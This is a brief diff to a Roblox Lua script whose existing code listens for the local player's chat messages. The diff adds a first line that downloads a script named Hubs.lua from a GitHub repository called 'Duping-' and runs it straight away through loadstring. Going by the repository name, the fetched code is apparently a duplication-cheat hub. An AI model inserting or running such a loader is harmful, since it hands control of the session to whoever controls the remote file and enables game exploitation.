@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1ll3rN4m3/Duping-/main/Hubs.lua", true))()
+
 local Player = game.Players.LocalPlayer
 
 Player.Chatted:connect(function(cht)
